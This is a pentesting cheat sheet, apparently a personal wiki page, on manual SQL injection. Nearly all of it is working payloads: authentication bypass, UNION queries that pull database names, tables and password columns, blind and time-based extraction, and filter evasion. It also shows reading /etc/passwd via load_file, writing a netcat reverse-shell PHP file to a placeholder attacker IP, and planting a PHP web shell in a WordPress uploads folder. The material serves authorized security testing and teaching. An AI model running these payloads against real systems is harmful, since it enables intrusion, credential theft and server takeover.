---
title: SQLi Cheat sheet for manual injection
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
---
# SQLi Cheat sheet for manual injection

!!! quote "Resources"
    - See a more detailed [explanation about SQL injection](webexploitation/sql-injection.md).
    - [PayloadsAllTheThings Original payloads for different SQL databases](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection).


??? quote "OWASP"
	[OWASP Web Security Testing Guide 4.2](OWASP/index.md) > 7. Data Validation Testing > 7.5. Testing for SQL Injection

	| ID  | Link to Hackinglife             | Link to OWASP     | Description                                                                                                                       | 
	| :-- | :------------------------------ | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | :-------------------------------------------------------------------------------------------------------------------------------- |
	| 7.5 | [WSTG-INPV-05](OWASP/WSTG-INPV-05.md) | [Testing for SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection) | - Identify SQL injection points.  - Assess the severity of the injection and the level of access that can be achieved through it. |


??? example "Languages and dictionaries"
	| Server | Dictionary |
	| -- | -- |
	|  [MySQL](mysql.md) | [MySQL payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/MySQL%20Injection.md). | 
	| [MSSQL](mssql.md) | [MSSQL payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/MSSQL%20Injection.md). |
	|  [PostgreSQL](5432-postgresql.md) | [PostgreSQL payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/PostgreSQL%20injection.md). |
	|  [Oracle](1521-oracle-transparent-network-substrate.md) | [Oracle SQL payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/Oracle-SQL-injections.md). |
	| [SQLite](sqlite.md) | [SQLite payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/SQLite-injection.md). | 
	| Cassandra | [Cassandra payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/Cassandra%20Injection.md). | 

??? example "Attack-based dictionaries"
    - [Generic SQL Injection Payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/generic-injections)
    - [Generic Error Based Payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/error-based).
    - [Generic Union Select Payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/union-select).
    - [SQL time based payloads ](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/time-based).
    - [SQL Injection Auth Bypass Payloads](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/auth-bypass) 

## Comment injection

Put a line comment at the end to comment out the rest of the query.

Valid for MySQL, SQL Server, PostgreSQL, Oracle, SQLite:

```
-- comment      // MySQL [Note the space after the double dash]
--comment       // MSSQL
--comment       // PostgreSQL
--comment       // Oracle


/*comment*/     // MySQL
/*comment*/     // MSSQL
/*comment*/     // PostgreSQL

#comment        // MySQL

```

## Boolean-based testing

### Integer based parameter injection

Common in Integer based parameter injection such as:

```
URL: https://site.com/user.php?id=1
SQL query: SELECT * FROM users WHERE id= FUZZ;
```

Typical payloads for that query:

```
# Return true
AND 1
And true

# Return False
AND 0
And false

# Return 56 if vulnerable
1*56

# Return 1 if not vulnerable
1*56

```

### String based parameter injection

```
URL: https://site.com/user.php?id=alexis
SQL query: SELECT * FROM users WHERE name= 'FUZZ';
```

Typical payloads for that query:

```
# Return true
''
""

# Return false
'
"
```

**Exploiting single quote (')**: In SQL, the single quote is used to delimit string literals. A way to exploit this is in a Login form:

```
# SQL query
SELECT * FROM users WHERE username = '<username>' AND password = '<password>'

# Payload
' OR '1'='1'; --

# The attacker's injected SQL code ' OR '1'='1'; -- causes the condition '1'='1' to evaluate to true, effectively bypassing the
authentication mechanism. Modified query would became
SELECT * FROM users WHERE username = '' OR '1'='1'; -- ' AND password = '<password>'
```


## Error-based testing

??? example "Dictionaries"
    [https://github.com/amandaguglieri/dictionaries/blob/main/SQL/error-based](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/error-based)

Firstly, every DBMS/RDBMS responds to incorrect/erroneous SQL queries with different error messages, so an error response can be use to fingerprint the database:

A typical error from MS-SQL will look like this:

```
Incorrect syntax near [query snippet]
```


While a typical MySQL error looks more like this:

```
You have an error in your SQL syntax. Check the manual that corresponds
to your MySQL server version for the right syntax to use near [query
snippet]
```


## UNION attack

??? example "Dictionaries"
    [https://github.com/amandaguglieri/dictionaries/blob/main/SQL/union-select](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/union-select)

### MYSQL

```
#########
MYSQL
#########

# Access (using null characters)
' OR '1'='1' %00
' OR '1'='1' %16


   
# 1. Bypass a form      
1' OR '1'='1';#
' OR '1'='1';#
1' OR '1'='1';-- - 
' OR '1'='1';-- -  


# 2. Number of columns (UNION attack)
1' OR '1'='1' order by 1;#
1' OR '1'='1' order by 2;#
1' OR '1'='1' order by 3;#
...
# Do this until you get an error message and then you will know the number of columns
# Another method to see the number of columns. 
' OR '1'='1' order by 1;-- -   

# 3. Get which column is being displayed. For instance, when we know we have 6 columns:
1' OR '1'='1' UNION SELECT 1,2,3,4,5,6;# 

# 4. Get names of all databases 
1' OR '1'='1' UNION SELECT null,table_schema,null,null,null,null,null FROM information_schema.tables;#
# 4. Get names of all databases in SQLite (name and schema of the tables stored in the database).
a' or '1'='1' union select tbl_name,2,3,4,5 from sqlite_master --


# 5. Get names of all tables from the selected database
1' OR '1'='1' UNION SELECT null,table_name,null,null,null,null FROM information_schema.tables;# 


# 6. Get the name of all columns of a selected table from a selected database
1' OR '1'='1' UNION SELECT null,column_name,null,null,null,null FROM information_schema.columns WHERE table_name='users';#


# 7. Get the value of a selected column (for instance, password)
1' OR '1'='1' UNION SELECT null,passwords,null,null,null,null FROM users;#

1' OR '1'='1' UNION SELECT null,passwords,null,null,null,null FROM <databaseName.tableName>;#

```


Other interesting queries:

```
database()
user()
@@version
SLEEP(5)
current_user()
```


### SQLite

```
#########
SQLite
#########

# Ensure that the targeted parameter is vulnerable
1' a' or '1'='1' --

# Determine the number of columns of the query
1' a' or '1'='1' order by 1 -- //returns all results
1' a' or '1'='1' order by 2 -- //returns all results
1' a' or '1'='1' order by 3 -- //returns all results
1' a' or '1'='1' order by 4 -- //returns all results
1' a' or '1'='1' order by 5 -- //returns all results
1' a' or '1'='1' order by 6 -- //returns none
# Therefore the query contains 5 columns.

# Determine which columns are being returned
1' a' or '1'='1' UNION SELECT 1,2,3,4,5 -- 
# The table in this demo returned values 1,3,4,5. Value 2 was not returned.

# Extract version of sqlite database
1' a' or '1'='1' UNION SELECT sqlite_version,NULL,NULL,NULL,NULL -- 

# Determine the name and schema of the tables stored in the database.
a' or '1'='1' union select tbl_name,2,3,4,5 from sqlite_master --

# Determine the SQL command used to construct the tables:
a' or '1'='1' union select sql,2,3,4,5 from sqlite_master --
# In this demo it returned:
1	CREATE TABLE results (rollno text primary key, email text, name text, marks real, rank integer)	4	5
1	CREATE TABLE secret_flag (flag text, value text)	4	5

# Retrieve two columns from a table
a' or '1'='1' union select flag,2,value,4,5 from secret_flag --
```

Also, once we know which column is injectable, there are some php functions that can provide us some worthy knowing data:

```
database()
user()
version()
sqlite_version()
```


Also, interesting payloads for retrieving concatenates values in a UNION based attack:

```
## Extract database names, table names and column names

#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```

And here an example of how to retrieve them:

```
# if injectable columns are number 2, 3 and 4 you can display some info from the system
union select 1, database(),user(),version(),5

# Extra bonus
# You can also load a file from the system with
union select 1, load_file(/etc/passwd),3,4,5

# and you can try to write to a file in the server
union select 1,'example example',3,4,5 into outfile '/var/www/path/to/file.txt'
union select 1,'example example',3,4,5 into outfile '/tmp/file.txt'

# and we can combine that with a reverse shell like
union select 1,'<?passthru("nc -e /bin/sh <attacker IP> <attacker port>") ?>', 3,4,5 into outfile '/tmp/reverse.php'
```


## SQLi Blind attack

Firstly you need to check the application response to different requests (and/or with false true statements). If you can tell true responses from false responses and validate that the application is processing the boolean values, then you can apply this technique. For that purpose the operator AND is more valuable. 

#### Boolean based

??? example "Dictionaries"
    [https://github.com/amandaguglieri/dictionaries/blob/main/SQL/error-based](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/error-based)

user() returns the name of the user currently using the database.
substring() returns a substring of the given argument. It takes three parameters: the input string, the position of the substring and its length.

Boolean based query:

```
' OR substring(user(), 1, 1) = 'a
' OR substring(user(), 1, 1) = 'b
```

More interesting queries:

```
# Database version
1 and substring(version(), 1, 1) = 4--

# Check that second character of the column user_email for user_name admin from table users is greater than the 'c' character  
1 and substring((SELECT user_email FROM users WHERE user_name = 'admin'),2,1) > 'c'
```

#### Time based

??? example "Dictionaries"
    [https://github.com/amandaguglieri/dictionaries/blob/main/SQL/time-based](https://github.com/amandaguglieri/dictionaries/blob/main/SQL/time-based)

!!! quote "Resources"
    - [OWASP resources](https://owasp.org/www-community/attacks/Blind_SQL_Injection)

Vulnerable SQL query:

```SQL
SELECT * from users WHERE username = '[username]' AND password = '[password]';
```

Time base query: 

```
' OR SLEEP(5) -- '
```

Interesting queries: 

```
1' AND SUBSTRING(user(), 1, 1 = 'r') sleep(0), sleep(10));#
```


Examples of available wait/timeout functions include:

- `WAITFOR DELAY '0:0:10'` in SQL Server
- `BENCHMARK()` and `sleep(10)` in MySQL
- `pg_sleep(10)` in PostgreSQL

```

```


## Extra Bonus: Bypassing quotation marks

Sometimes quotation marks get filtered in SQL queries. To bypass that when querying some tablename, maybe we can skip quotation marks by entering tablename directly in HEX values.

More bypassing tips:

```
# Using mingled upper and lowercase

# Using spaces url encoded
+

# Using comments
/**/
/**
--
; --
; /*
; //

# Example of bypassing webpages that only displays one value at a time
1'+uNioN/**/sEleCt/**/table_name,2+fROm+information_schema.tables+where+table_schema?'dvwa'+limit+1,1%23&Submit=Submit#

```


## Extra Bonus: Gaining a reverse shell from SQL injection

Take a wordpress installation that uses a mysql database. If you manage to login into the mysql pannel (/phpmyadmin) as root then you could upload a php shell to the /wp-content/uploads/ folder.

```mysql
Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
```

## Extra Bonus: DUAL

The DUAL is a special one row, one column table present by default in all Oracle databases. The owner of DUAL is SYS, but DUAL can be accessed by every user. This is a possible payload for SQLi:

```
'+UNION+SELECT+NULL+FROM+dual--
```

Oracle syntax requires the use of FROM, but some queries don't requires any table. For these case we use DUAL. Also Oracle doesn't allow the queries that employ information_schema.tables.

